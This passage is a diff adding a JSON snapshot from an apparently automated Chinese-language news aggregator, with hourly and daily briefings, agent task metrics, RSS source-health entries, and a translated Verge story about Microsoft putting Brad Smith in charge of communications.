@@ -1,5 +1,1548 @@
 [
   {
+    "timestamp": 1790289534666,
+    "timeDisplay": "2026-09-25 06:38 (UTC+8)",
+    "date": "2026-09-25",
+    "runId": "feed-20260924T223006649Z-k0itcn",
+    "generatedAt": "2026-09-24T22:38:54.666Z",
+    "hourlyBriefing": {
+      "title": "本小时国际动态简报",
+      "lead": "本时段国际要闻涵盖中东军事与外交抗议、跨国情报调查披露、拉美外交动态以及深空天文探索新进展。",
+      "summary": "在国际舞台上，某国总理就中东多地军事行动发表强硬辩护演讲，批评纽约市长Zohran Mamdani，演说引发数十名代表离席退场；哥伦比亚政府公开指责德黑兰涉嫌与国际恐怖组织存在关联。安全与情报领域，英国巴斯大学（University of Bath）最新研究揭示了9/11袭击前夕美国中央情报局（CIA）反复未能向联邦调查局（FBI）共享两名劫机者信息的关键失误。此外，天文学界在搜寻地外生命的探索中指出，目前编目的6300多颗系外行星中绝大多数并非岩石行星，仅极少数岩石行星显现出具备大气层的迹象。"
+    },
+    "dailyBriefing": {
+      "title": "信息不足，无法形成可靠的日尺度分析",
+      "lead": "证据包中缺少目标文章的标题、来源、正文、发布时间、链接及可引用事实；相关条目大多仅显示待翻译占位标题，因此无法据此编排或判断当日主题。",
+      "themes": [
+        {
+          "name": "证据缺失",
+          "analysis": "当前材料未提供可核验的文章内容和引用信息。仅有的少量摘要涉及系外行星大气、美国“9·11”情报失误、哥伦比亚与伊朗关系，以及以色列政府相关言论，彼此缺乏足够上下文，不能据此概括为稳定的共同主题或趋势。"
+        }
+      ]
+    },
+    "storiesCount": 16,
+    "taskMetrics": {
+      "totalTasks": 89,
+      "completedTasks": 89,
+      "succeeded": 56,
+      "degraded": 33,
+      "failed": 0,
+      "skipped": 0,
+      "totalAttempts": 89,
+      "timeouts": 0,
+      "maxConcurrency": 8,
+      "peakConcurrency": 8,
+      "durationMs": 527954,
+      "byRole": {
+        "translator": {
+          "attempts": 58,
+          "succeeded": 32,
+          "degraded": 26
+        },
+        "fact-extractor": {
+          "attempts": 9,
+          "degraded": 5,
+          "succeeded": 4
+        },
+        "hourly-editor": {
+          "attempts": 1,
+          "succeeded": 1
+        },
+        "daily-analyst": {
+          "attempts": 1,
+          "succeeded": 1
+        },
+        "social-trends": {
+          "attempts": 1,
+          "succeeded": 1
+        },
+        "source-positioner": {
+          "attempts": 9,
+          "succeeded": 7,
+          "degraded": 2
+        },
+        "topic-classifier": {
+          "attempts": 9,
+          "succeeded": 9
+        },
+        "evidence-merger": {
+          "attempts": 1,
+          "succeeded": 1
+        }
+      },
+      "byModel": {
+        "gemini-3.8-flash": {
+          "attempts": 89,
+          "succeeded": 56,
+          "degraded": 33
+        }
+      }
+    },
+    "degradedRoles": [
+      "article-1-translator-0",
+      "article-4-translator-0",
+      "article-6-translator-0",
+      "article-6-translator-1",
+      "article-7-translator-0",
+      "article-8-translator-0",
+      "article-10-translator-0",
+      "article-13-translator-0",
+      "article-14-translator-0",
+      "article-15-translator-0",
+      "article-16-translator-0",
+      "article-17-translator-0",
+      "article-18-translator-0",
+      "article-19-translator-0",
+      "article-20-translator-0",
+      "article-21-translator-0",
+      "article-23-translator-0",
+      "article-27-translator-0",
+      "article-27-translator-1",
+      "article-30-translator-0",
+      "article-32-translator-0",
+      "article-34-translator-0",
+      "article-34-translator-1",
+      "article-35-translator-0",
+      "article-36-translator-2",
+      "article-37-translator-2",
+      "article-0-fact-extractor",
+      "article-3-fact-extractor",
+      "article-3-source-positioner",
+      "article-5-fact-extractor",
+      "article-6-fact-extractor",
+      "article-6-source-positioner",
+      "article-7-fact-extractor"
+    ],
+    "sourceHealth": [
+      {
+        "sourceId": "afp",
+        "name": "AFP Actualités (官方法文原版)",
+        "url": "https://www.afp.com/fr/actus/afp_communique/all/feed",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:46.527Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.190Z"
+      },
+      {
+        "sourceId": "afp",
+        "name": "AFP News (官方英文原版)",
+        "url": "https://www.afp.com/en/actus/afp_communique/all/feed",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:46.617Z",
+        "lastSuccessAt": "2026-09-24T22:29:46.997Z"
+      },
+      {
+        "sourceId": "aljazeera",
+        "name": "Al Jazeera (半岛电视台官方英文)",
+        "url": "https://www.aljazeera.com/xml/rss/all.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.510Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.691Z"
+      },
+      {
+        "sourceId": "aljazeera",
+        "name": "Al Jazeera (半岛电视台官方阿拉伯文)",
+        "url": "https://www.aljazeera.net/aljazeerarss/",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.575Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.919Z"
+      },
+      {
+        "sourceId": "ansa",
+        "name": "ANSA English (安莎社官方英文)",
+        "url": "https://www.ansa.it/english/news/english_nr_rss.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.774Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.720Z"
+      },
+      {
+        "sourceId": "ansa",
+        "name": "ANSA Mondo (意大利安莎社官方意大利文)",
+        "url": "https://www.ansa.it/sito/notizie/mondo/mondo_rss.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.644Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.350Z"
+      },
+      {
+        "sourceId": "aws",
+        "name": "AWS Machine Learning Blog (亚马逊云科技官方英文)",
+        "url": "https://aws.amazon.com/blogs/machine-learning/feed/",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:50.553Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.707Z"
+      },
+      {
+        "sourceId": "bbc",
+        "name": "BBC World (英国BBC官方英文)",
+        "url": "http://feeds.bbci.co.uk/news/world/rss.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:46.783Z",
+        "lastSuccessAt": "2026-09-24T22:29:46.991Z"
+      },
+      {
+        "sourceId": "cnbc",
+        "name": "CNBC Economy (CNBC 宏观经济)",
+        "url": "https://www.cnbc.com/id/20910258/device/rss/rss.html",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.750Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.930Z"
+      },
+      {
+        "sourceId": "cnbc",
+        "name": "CNBC Markets (CNBC 市场官方英文)",
+        "url": "https://www.cnbc.com/id/10000664/device/rss/rss.html",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.719Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.925Z"
+      },
+      {
+        "sourceId": "cnn",
+        "name": "CNN Top Stories (美国CNN要闻)",
+        "url": "http://rss.cnn.com/rss/cnn_topstories.rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.351Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.750Z"
+      },
+      {
+        "sourceId": "cnn",
+        "name": "CNN World (美国CNN官方英文)",
+        "url": "http://rss.cnn.com/rss/edition_world.rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.190Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.676Z"
+      },
+      {
+        "sourceId": "dw",
+        "name": "Deutsche Welle (DE 官方德语)",
+        "url": "https://rss.dw.com/rdf/rss-de-all",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:46.997Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.492Z"
+      },
+      {
+        "sourceId": "dw",
+        "name": "Deutsche Welle (EN 官方英语)",
+        "url": "https://rss.dw.com/rdf/rss-en-all",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.185Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.900Z"
+      },
+      {
+        "sourceId": "esa",
+        "name": "ESA Space News (欧洲航天局官方英文)",
+        "url": "https://www.esa.int/rssfeed/Our_Activities/Space_News",
+        "ok": true,
+        "itemCount": 9,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:50.132Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.831Z"
+      },
+      {
+        "sourceId": "ecb",
+        "name": "European Central Bank (欧洲央行官方英文)",
+        "url": "https://www.ecb.europa.eu/rss/press.html",
+        "ok": true,
+        "itemCount": 15,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:49.101Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.786Z"
+      },
+      {
+        "sourceId": "fed",
+        "name": "Federal Reserve (美国联邦储备委员会官方英文)",
+        "url": "https://www.federalreserve.gov/feeds/press_all.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:49.936Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.320Z"
+      },
+      {
+        "sourceId": "ft",
+        "name": "Financial Times (英国金融时报)",
+        "url": "https://www.ft.com/rss/home/uk",
+        "ok": true,
+        "itemCount": 11,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.848Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.185Z"
+      },
+      {
+        "sourceId": "fox",
+        "name": "FOX News Latest (美国FOX快讯)",
+        "url": "https://moxie.foxnews.com/google-publisher/latest.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.502Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.575Z"
+      },
+      {
+        "sourceId": "fox",
+        "name": "FOX News World (美国FOX官方英文)",
+        "url": "https://moxie.foxnews.com/google-publisher/world.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.492Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.593Z"
+      },
+      {
+        "sourceId": "france24",
+        "name": "France 24 (EN 官方英语原版)",
+        "url": "https://www.france24.com/en/rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:46.738Z",
+        "lastSuccessAt": "2026-09-24T22:29:46.783Z"
+      },
+      {
+        "sourceId": "france24",
+        "name": "France 24 (FR 官方法语原版)",
+        "url": "https://www.france24.com/fr/rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:45.890Z",
+        "lastSuccessAt": "2026-09-24T22:29:46.738Z"
+      },
+      {
+        "sourceId": "github",
+        "name": "GitHub Blog (工程技术博客)",
+        "url": "https://github.blog/feed/",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.164Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.433Z"
+      },
+      {
+        "sourceId": "deepmind",
+        "name": "Google DeepMind (AI前沿研究)",
+        "url": "https://deepmind.google/blog/rss.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.059Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.385Z"
+      },
+      {
+        "sourceId": "hackernews",
+        "name": "Hacker News (科技前沿论坛)",
+        "url": "https://news.ycombinator.com/rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.919Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.164Z"
+      },
+      {
+        "sourceId": "huggingface",
+        "name": "Hugging Face (开源模型社区)",
+        "url": "https://huggingface.co/blog/feed.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.156Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.327Z"
+      },
+      {
+        "sourceId": "lobsters",
+        "name": "Lobste.rs (极客思想社区)",
+        "url": "https://lobste.rs/rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.385Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.774Z"
+      },
+      {
+        "sourceId": "marketwatch",
+        "name": "MarketWatch Top Stories (市场观察)",
+        "url": "https://feeds.content.dowjones.io/public/rss/mw_topstories",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.838Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.947Z"
+      },
+      {
+        "sourceId": "microsoft",
+        "name": "Microsoft Research (微软研究院官方英文)",
+        "url": "https://www.microsoft.com/en-us/research/feed/",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:50.320Z",
+        "lastSuccessAt": "2026-09-24T22:29:53.945Z"
+      },
+      {
+        "sourceId": "mit",
+        "name": "MIT Tech Review (麻省理工科技评论)",
+        "url": "https://www.technologyreview.com/feed/",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.171Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.394Z"
+      },
+      {
+        "sourceId": "nasa",
+        "name": "NASA News (深空探索与航天)",
+        "url": "https://www.nasa.gov/news-release/feed/",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.435Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.883Z"
+      },
+      {
+        "sourceId": "nature",
+        "name": "Nature News (自然科学顶级期刊)",
+        "url": "https://www.nature.com/nature.rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.394Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.498Z"
+      },
+      {
+        "sourceId": "npr",
+        "name": "NPR World (美国国家公共电台官方英文)",
+        "url": "https://feeds.npr.org/1001/rss.xml",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.498Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.936Z"
+      },
+      {
+        "sourceId": "nvidia",
+        "name": "NVIDIA Developer Blog (英伟达开发者官方英文)",
+        "url": "https://developer.nvidia.com/blog/feed/",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:50.350Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.553Z"
+      },
+      {
+        "sourceId": "nytimes",
+        "name": "NY Times World (纽约时报官方英文)",
+        "url": "https://rss.nytimes.com/services/xml/rss/nyt/World.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.593Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.719Z"
+      },
+      {
+        "sourceId": "oilprice",
+        "name": "OilPrice (全球能源与原油大宗)",
+        "url": "https://oilprice.com/rss/main",
+        "ok": true,
+        "itemCount": 15,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.900Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.483Z"
+      },
+      {
+        "sourceId": "openai",
+        "name": "OpenAI News (官方动态)",
+        "url": "https://openai.com/news/rss.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.947Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.156Z"
+      },
+      {
+        "sourceId": "science",
+        "name": "Phys.org (基础物理与技术前沿)",
+        "url": "https://phys.org/rss-feed/",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.483Z",
+        "lastSuccessAt": "2026-09-24T22:29:49.101Z"
+      },
+      {
+        "sourceId": "reddit",
+        "name": "Reddit r/technology (科技伦理热议)",
+        "url": "https://www.reddit.com/r/technology/top/.rss?t=day",
+        "ok": false,
+        "itemCount": 0,
+        "error": "HTTP 429",
+        "checkedAt": "2026-09-24T22:29:48.327Z",
+        "lastSuccessAt": null
+      },
+      {
+        "sourceId": "reddit",
+        "name": "Reddit r/worldnews (国际公众热议)",
+        "url": "https://www.reddit.com/r/worldnews/top/.rss?t=day",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.238Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.644Z"
+      },
+      {
+        "sourceId": "ria",
+        "name": "RIA Novosti (俄新社官方俄文)",
+        "url": "https://ria.ru/export/rss2/archive/index.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:45.888Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.351Z"
+      },
+      {
+        "sourceId": "science",
+        "name": "Science Magazine (科学杂志)",
+        "url": "https://www.science.org/rss/news_current.xml",
+        "ok": false,
+        "itemCount": 0,
+        "error": "HTTP 403",
+        "checkedAt": "2026-09-24T22:29:48.433Z",
+        "lastSuccessAt": null
+      },
+      {
+        "sourceId": "sputnik",
+        "name": "Sputnik Globe (官方国际英文电讯)",
+        "url": "https://sputnikglobe.com/export/rss2/archive/index.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:45.889Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.502Z"
+      },
+      {
+        "sourceId": "tass",
+        "name": "TASS (塔斯社官方英文)",
+        "url": "https://tass.com/rss/v2.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.883Z",
+        "lastSuccessAt": "2026-09-24T22:29:51.020Z"
+      },
+      {
+        "sourceId": "techcrunch",
+        "name": "TechCrunch (硅谷创业与资本)",
+        "url": "https://techcrunch.com/feed/",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.930Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.171Z"
+      },
+      {
+        "sourceId": "guardian",
+        "name": "The Guardian (英国卫报官方英文)",
+        "url": "https://www.theguardian.com/world/rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:46.991Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.185Z"
+      },
+      {
+        "sourceId": "guardian",
+        "name": "The Guardian Society (卫报社会与民生)",
+        "url": "https://www.theguardian.com/society/rss",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.185Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.238Z"
+      },
+      {
+        "sourceId": "theverge",
+        "name": "The Verge (前沿数码科技)",
+        "url": "https://www.theverge.com/rss/index.xml",
+        "ok": true,
+        "itemCount": 10,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.925Z",
+        "lastSuccessAt": "2026-09-24T22:29:48.059Z"
+      },
+      {
+        "sourceId": "un",
+        "name": "UN News (联合国官方英文)",
+        "url": "https://news.un.org/feed/subscribe/en/news/all/rss.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.885Z",
+        "lastSuccessAt": "2026-09-24T22:29:49.936Z"
+      },
+      {
+        "sourceId": "who",
+        "name": "WHO News (世界卫生组织官方英文)",
+        "url": "https://www.who.int/rss-feeds/news-english.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:48.936Z",
+        "lastSuccessAt": "2026-09-24T22:29:50.132Z"
+      },
+      {
+        "sourceId": "wsj",
+        "name": "WSJ Business (华尔街日报商业)",
+        "url": "https://feeds.a.dj.com/rss/WSJcomUSBusiness.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.691Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.838Z"
+      },
+      {
+        "sourceId": "wsj",
+        "name": "WSJ Markets (华尔街日报市场)",
+        "url": "https://feeds.a.dj.com/rss/RSSMarketsMain.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:47.676Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.848Z"
+      },
+      {
+        "sourceId": "chinanews",
+        "name": "中新社 (国际实时原版)",
+        "url": "https://www.chinanews.com.cn/rss/world.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:45.870Z",
+        "lastSuccessAt": "2026-09-24T22:29:46.527Z"
+      },
+      {
+        "sourceId": "chinanews",
+        "name": "中新网 (全球要闻原版)",
+        "url": "https://www.chinanews.com.cn/rss/importnews.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:45.886Z",
+        "lastSuccessAt": "2026-09-24T22:29:46.617Z"
+      },
+      {
+        "sourceId": "xinhua",
+        "name": "新华国际 (官方中文原版)",
+        "url": "http://www.news.cn/world/news_world.xml",
+        "ok": true,
+        "itemCount": 16,
+        "error": null,
+        "checkedAt": "2026-09-24T22:29:45.887Z",
+        "lastSuccessAt": "2026-09-24T22:29:47.510Z"
+      }
+    ],
+    "topStories": [
+      {
+        "id": "story-25-igrok-2120141468-html-3ee7aa9e0b6ae465",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Футболист сборной Косова показал провокационный логотип после гола",
+        "source": "RIA Novosti (俄新社官方俄文)",
+        "sourceSlug": "ria",
+        "sourceLang": "ru",
+        "publishedAt": "2026-09-24T22:29:21.000Z",
+        "pubTime": "2026-09-25 06:29",
+        "url": "https://ria.ru/20260925/igrok-2120141468.html",
+        "imageUrl": null,
+        "fullContent": "",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "missing",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 0,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【RIA Novosti (俄新社官方俄文)】于 2026-09-25 06:29 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "RIA Novosti (俄新社官方俄文)",
+            "url": "https://ria.ru/20260925/igrok-2120141468.html",
+            "publishedAt": "2026-09-24T22:29:21.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-comms-pr-brad-smith-cela-99ff6e3fec1ed6bf",
+        "title": "微软任命布拉德·史密斯掌管传播业务",
+        "originalTitle": "Microsoft puts Brad Smith in charge of communications",
+        "source": "The Verge (前沿数码科技)",
+        "sourceSlug": "theverge",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:08:22.000Z",
+        "pubTime": "2026-09-25 06:08",
+        "url": "https://www.theverge.com/news/1000374/microsoft-comms-pr-brad-smith-cela",
+        "imageUrl": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/09/gettyimages-2268973139.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100",
+        "fullContent": "Posts from this topic will be added to your daily email digest and your homepage feed.\n\nMicrosoft’s communications are moving over to the legal and corporate side of the house.\n\nPosts from this author will be added to your daily email digest and your homepage feed.\n\nSee All by Tom Warren\n\nMicrosoft is moving its communications group out of marketing and into its Corporate, External, and Legal Affairs (CELA) organization. The surprise change will see Microsoft vice chair and president Brad Smith oversee communications, while the company searches for a replacement for Frank Shaw, chief communications officer, who is departing later this year.\n\nMicrosoft CEO Satya Nadella thanked Shaw “for everything he has done for Microsoft” in an internal memo announcing the communications changes. Shaw announced earlier this month that he’s leaving Microsoft after nearly three decades supporting the company’s communications.\n\nBrent Colburn, VP of global public affairs, has been appointed as interim communications leader to help navigate what Nadella calls “a media environment that is increasingly fragmented and noisier than ever.” Nadella also says he’s “excited about the opportunity to help our engineers, sellers, partners, and others closest to our products and customers become an even bigger part of how we tell our story.”\n\nAs GeekWire points out, that sounds a lot like how AI startups work, with researchers leading the demos and blogs at companies like OpenAI and Anthropic. Microsoft has been chasing Google, Anthropic, and OpenAI to “become one of the top four labs in the world,” according to Microsoft AI CEO Mustafa Suleyman. In an interview with The Verge earlier this year, Suleyman said he wants Microsoft “to build the very best frontier models in the world.”\n\nBrad Smith, who’s taking over communications from chief marketing officer Takeshi Numoto, is often the public face of Microsoft’s policy and corporate communications. Smith travels the world meeting with governments, regulators, and Microsoft’s customers. It’s still not clear who will take over permanently from Shaw later this year, but Microsoft is looking at both internal and external candidates.\n\nHere’s Satya Nadella’s memo:\n\nCommunications has never been more important to Microsoft. The company is changing, our industry is changing, and the world around us is changing. And in a media environment that is increasingly fragmented and noisier than ever, we need to continue to be grounded in our mission, earn trust each day, and find new ways to connect directly with all of our constituencies.\n\nI first want to thank Frank for everything he has done for Microsoft. He has made tremendous contributions to the company and to our communications function over the last 17+ years. And he’s been a great source of counsel to our leadership team and to me personally, across the company’s biggest moments.\n\nAs Frank prepares to embark on his next chapter, Takeshi, Brad, and I have been discussing the evolution of comms at the company. I have asked Brad to lead the communications function going forward. Few leaders embody Microsoft’s voice as authentically as Brad. He brings a deep understanding of our business, a strong connection to our stakeholders, and a rare ability to communicate complex ideas with clarity, conviction, and trust.\n\nDuring this transition, Brent Colburn will continue reporting to Brad and will now act as our interim communications leader. The comms leadership team will report to Brent, and Frank will continue to advise Brad and Brent on the transition.\n\nIn many ways, the people closest to the work have the best opportunity to shape how Microsoft is understood. We need to give people across the company the tools and support to do it well. And I’m excited about the opportunity to help our engineers, sellers, partners, and others closest to our products and customers become an even bigger part of how we tell our story, all connected by a shared strategy and set of principles. All of you have a critical role to play in making that possible.\n\nWe have an exciting fall ahead, with a number of important moments and events coming up and great marketing behind them. It is a real opportunity to bring together our product story, our marketing, and our communications in new ways.\n\nWe will learn, we will experiment, and we will evolve. There is a fundamentally new way to think about communications, and this team will be central to building it.\n\nThank you for everything you do for Microsoft, and for the role you each play in telling our story.\n\nA free daily digest of the news that matters most.\n\nThis is the title for the native ad",
+        "fullTranslation": "该主题的推送将添加到您的每日邮件摘要和主页动态中。\n微软的传播业务正转至法律与公司事务部门。\n该作者的推送将添加到您的每日邮件摘要和主页动态中。\n查看汤姆·沃伦（Tom Warren）的全部文章\n\n微软正将其传播团队从营销部门剥离，并入公司法务与外部事务（CELA）部门。这一令人意外的变动将使微软副董事长兼总裁布拉德·史密斯（Brad Smith）负责监督传播业务，与此同时，公司正在寻找首席传播官弗兰克·肖（Frank Shaw）的接替人选，后者将于今年晚些时候离职。\n\n微软首席执行官萨提亚·纳德拉（Satya Nadella）在宣布传播架构调整的内部备忘录中，对弗兰克·肖“为微软所做的一切”表示感谢。肖本月早些时候宣布，在为公司的传播业务服务近三十年后，他将离开微软。\n\n全球公共事务副总裁布伦特·科尔伯恩（Brent Colburn）已被任命为临时传播主管，以协助应对纳德拉所称的“日益碎片化且比以往任何时候都更加嘈杂的媒体环境”。纳德拉还表示，他“对有机会帮助我们的工程师、销售人员、合作伙伴以及其他最贴近我们产品与客户的人员，在讲述我们的故事方面发挥更大作用而感到振奋”。\n\n正如科技媒体GeekWire指出的那样，这听起来非常像人工智能初创公司的运作方式，在OpenAI和Anthropic等公司中，演示和博客通常由研究人员主导。据微软AI首席执行官穆斯塔法·苏莱曼（Mustafa Suleyman）称，微软一直在追赶谷歌、Anthropic和OpenAI，“以成为全球四大顶级实验室之一”。在今年早些时候接受The Verge采访时，苏莱曼曾表示，他希望微软“打造出全球最顶尖的前沿模型”。\n\n从首席营销官沼本健（Takeshi 